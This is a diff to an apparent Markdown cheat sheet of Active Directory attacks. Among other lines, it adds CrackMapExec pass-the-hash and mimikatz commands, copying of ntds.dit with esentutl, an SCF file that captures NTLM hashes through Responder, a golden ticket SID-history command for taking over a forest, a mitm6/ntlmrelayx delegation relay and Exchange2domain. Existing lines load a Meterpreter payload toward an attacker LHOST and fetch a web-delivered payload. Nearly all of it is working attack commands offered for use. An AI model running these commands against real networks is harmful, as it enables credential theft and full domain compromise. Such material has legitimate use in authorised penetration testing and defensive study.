@@ -26,10 +26,13 @@
     * [MS08-068 NTLM reflection](#ms08-068-ntlm-reflection)
     * [SMB Signing Disabled](#smb-signing-disabled)
     * [Drop the MIC](#drop-the-mic)
+  * [SCF file attack against writeable share](#scf-file-attack-against-writeable-share)
   * [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
   * [Trust relationship between domains](#trust-relationship-between-domains)
+  * [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
   * [Unconstrained delegation](#unconstrained-delegation)
   * [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
+  * [Relay delegation with mitm6](#relay-delegation-with-mitm6)
   * [PrivExchange attack](#privexchange-attack)
   * [Password spraying](#password-spraying)
   * [Extract accounts from /etc/krb5.keytab](#extract-accounts-from-etc-krb5-keytab)
@@ -64,13 +67,14 @@
   git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
   crackmapexec smb -L
   crackmapexec smb -M name_module -o VAR=DATA
-  crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --local-auth
-  crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --shares
-  crackmapexec 192.168.1.100 -u Jaddmon -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
-  crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
-  crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
-  crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
-  crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
+  crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
+  crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
+  crackmapexec 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
+  crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
+  crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
+  crackmapexec 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
+  crackmapexec 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
+  crackmapexec smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
   crackmapexec mimikatz --server http --server-port 80
   ```
 
@@ -365,6 +369,14 @@ dir c:\exfil
 reg.exe save hklm\system c:\exfil\system.bak
 ```
 
+#### Using esentutl.exe
+
+Copy/extract a locked file such as the AD Database
+
+```powershell
+esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
+```
+
 #### Extract hashes from ntds.dit
 
 then you need to use secretsdump to extract the hashes
@@ -556,6 +568,9 @@ Mitigations:
 ### KRB_AS_REP Roasting
 
 If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting
+
+Prerequisite:
+- Accounts have to have **DONT_REQ_PREAUTH**
 
 ```powershell
 C:\>git clone https://github.com/GhostPack/Rubeus#asreproast
@@ -766,6 +781,19 @@ python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
     secretsdump.py -k -no-pass second-dc-server.local -just-dc
     ```
 
+
+### SCF file attack against writeable share
+
+Drop the following `something.scf` file inside a share and start listening with Responder : `responder -wrf --lm -v -I eth0`
+
+```powershell
+[Shell]
+Command=2
+IconFile=\\10.10.XX.XX\Share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
 ### Dangerous Built-in Groups Usage
 
 If you do not want modified ACLs to be overwrite every hour, you should change ACL template on the object CN=AdminSDHolder,CN=System, " or set "adminCount" attribute to 0 for the required objec
@@ -794,6 +822,25 @@ SourceName          TargetName                    TrustType      TrustDirection
 ----------          ----------                    ---------      --------------
 domainA.local      domainB.local                  TreeRoot       Bidirectional
 ```
+
+### Child Domain to Forest Compromise - SID Hijacking
+
+Most trees are linked with dual sided trust relationships to allow for sharing of resources.
+By default the first domain created if the Forest Root.
+
+Prerequisite: 
+- KRBTGT Hash
+
+- Find the SID of the domain
+    ```powershell
+    $ Convert-NameToSid target.domain.com\krbtgt
+    S-1-5-21-2941561648-383941485-1389968811-502
+    ```
+- Replace 502 with 519 to represent Enterprise Admins
+- Create golden ticket and attack parent domain. 
+    ```powershell
+    kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
+    ```
 
 ### Unconstrained delegation
 
@@ -930,6 +977,23 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
     [+] Ticket successfully imported!
     ```
 
+### Relay delegation with mitm6
+
+Prerequisites: 
+- IPv6 enabled (Windows prefers IPV6 over IPv4)
+- LDAP over TLS (LDAPS)
+
+> ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it.
+
+```powershell
+git clone https://github.com/fox-it/mitm6.git 
+cd /opt/tools/mitm6
+pip install .
+
+mitm6 -hw ws02 -d lab.local --ignore-nofqnd
+ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
+then use rubeus with s4u to relay the delegation
+```
 
 ### PrivExchange attack
 
@@ -978,6 +1042,14 @@ Exchange your privileges for Domain Admin privs by abusing Exchange.
 Alternatively you can use the Metasploit module 
 
 [`use auxiliary/scanner/http/exchange_web_server_pushsubscription`](https://github.com/rapid7/metasploit-framework/pull/11420)
+
+Alternatively you can use an all-in-one tool : Exchange2domain.
+
+```powershell
+git clone github.com/Ridter/Exchange2domain 
+python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip
+python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip
+```
 
 ### Password spraying
 
@@ -1189,4 +1261,5 @@ Navigate to any web application that is integrated with our AAD domain. Once at 
 * [Playing with Relayed Credentials - June 27, 2018](https://www.secureauth.com/blog/playing-relayed-credentials)
 * [Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
 * [Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019](https://blog.preempt.com/drop-the-mic)
-* [How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous](https://www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/)
+* [How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous](https:/www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/)
+* [SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX](pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
